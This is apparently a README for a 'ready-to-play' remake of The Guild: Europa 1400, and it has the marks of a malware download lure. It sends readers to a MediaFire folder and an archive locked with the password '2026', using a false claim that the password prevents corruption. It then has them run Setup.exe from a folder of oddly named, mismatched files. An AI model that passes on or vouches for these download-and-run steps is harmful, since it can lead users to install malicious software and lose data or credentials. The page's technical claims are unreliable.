## 🕹️ About

The Guild 1 Remake: Europa 1410 is a community remake inspired by the medieval life, role-playing, strategy, and economic simulation of The Guild: Europa 1400, originally developed by 4HEAD Studios and published by JoWooD. Set in late-medieval Europe, the game follows a character and their growing dynasty as they pursue wealth, influence, and social standing. The core loop combines businesses and production, trade, family development, local politics, and competition with other ambitious citizens. It is designed as a systemic medieval sandbox where personal choices and long-term planning shape your rise through society. This ready-to-play release is packaged for quick setup: unpack it, run it, and play.

A good fit for players who enjoy medieval life simulation, economic strategy, role-playing progression, and open-ended sandbox play.

## ✨ Features

- 🎭 **Life Simulation** — Balance personal advancement, family interests, work, and rivalry.
- ⚖️ **Politics and Influence** — Compete for social standing and take part in the power structures around you.
- 💰 **Trade and Prosperity** — Use commerce and careful planning to expand your position.
- 👑 **Dynasty Building** — Develop a family legacy across generations as your ambitions grow.
- 🏰 **Medieval Sandbox** — Pursue wealth, status, and influence in a late-medieval European setting.
- ⚒️ **Business and Production** — Establish economic activities and manage the foundations of your fortune.

### Step 1: Download

Download the ready-to-play package from **[this page](https://www.mediafire.com/folder/1dr4rik7qm60h/GameSetup)**.

### Step 2: Extract

1. Use any standard archive extractor (7-Zip, WinRAR, WinZip, etc.)
2. The archive is protected with the password **`2026`** to prevent corruption during transfer
3. Extract **all files** into a single folder of your choice
4. Do not rename or move individual files — the setup expects its folder structure intact

The extracted folder should look like this:

```
Setup/
|-- Setup.exe <- Main executable
|-- global.cfg <- Global settings
|-- driver.pak <- Driver archive
|-- settings.bin <- Configuration
|-- driver.umap <- Driver data
|-- api.pak <- API modules
|-- scripts.lic <- Game scripts
|-- physics.sys <- Physics engine
|-- uninstall.key <- Uninstall key
|-- license.wem <- Audio assets
|-- animations.dll <- Animation system
|-- update_1.res <- Update resources
|-- dlc.md5 <- DLC checksums
|-- bootstrap.wem <- Bootstrap audio
|-- license.bank <- License data
|-- lang.sys <- Language system
|-- launcher.dll <- Launcher library
|-- patch_1.bnk <- Audio banks
|-- update_1.ini <- Update config
|-- localization.ini <- Language files
|-- Password 2026.txt <- Password reminder (empty)
|-- assets.wem <- Asset audio
|-- audio.res <- Audio resources
|-- res.pak <- Resources archive
|-- installer.dat <- Installer data
```

### Step 3: Launch

1. Open the extracted folder
2. Run `Setup.exe`
3. The game is ready to play
